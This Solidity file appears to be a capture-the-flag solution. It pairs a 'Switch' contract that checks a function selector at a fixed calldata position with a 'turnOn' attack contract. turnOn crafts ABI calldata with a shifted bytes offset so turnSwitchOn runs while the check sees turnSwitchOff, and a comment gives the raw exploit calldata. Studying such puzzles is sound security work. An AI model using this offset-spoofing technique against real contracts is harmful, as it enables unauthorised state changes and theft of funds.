// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }

}

contract turnOn {
    uint256 public offset = 0x60;
    uint256 public zero = 0x0;
    uint256 public length = 0x4;
    uint256 public offSelector = uint256(uint32(bytes4(keccak256("turnSwitchOff()"))))<<224;
    uint256 public onSelector = uint256(uint32(bytes4(keccak256("turnSwitchOn()"))))<<224;
    bytes public data = abi.encode(offset,zero,offSelector,length,onSelector);
    
    constructor(Switch target) {
        address(target).call(
            abi.encodeWithSignature("flipSwitch(bytes)",
            offset,
            zero,
            offSelector,
            length,
            onSelector
            )
        );
        require(target.switchOn()==true,"turnOn failed");
    }
}

// 0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000